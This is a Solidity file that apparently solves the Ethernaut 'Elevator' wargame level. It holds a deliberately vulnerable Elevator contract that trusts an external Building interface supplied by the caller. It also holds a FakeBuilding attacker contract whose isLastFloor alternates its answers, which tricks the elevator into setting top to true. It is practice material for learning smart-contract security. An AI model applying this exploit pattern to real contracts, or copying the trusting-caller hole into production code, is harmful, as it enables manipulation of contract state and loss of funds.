// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract FakeBuilding {
    uint256 public counter;
    event LastFloor(uint256, bool);

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool lastFloor;
        if (counter % 2 == 0) {
            lastFloor = false;
        } else {
            lastFloor = true;
        }

        emit LastFloor(counter, lastFloor);
        counter++;
        return lastFloor;
    }

    function goToLastFloor(address _elevator, uint256 _floor) public {
        Elevator elevator = Elevator(_elevator);
        elevator.goTo(_floor);
    }
}
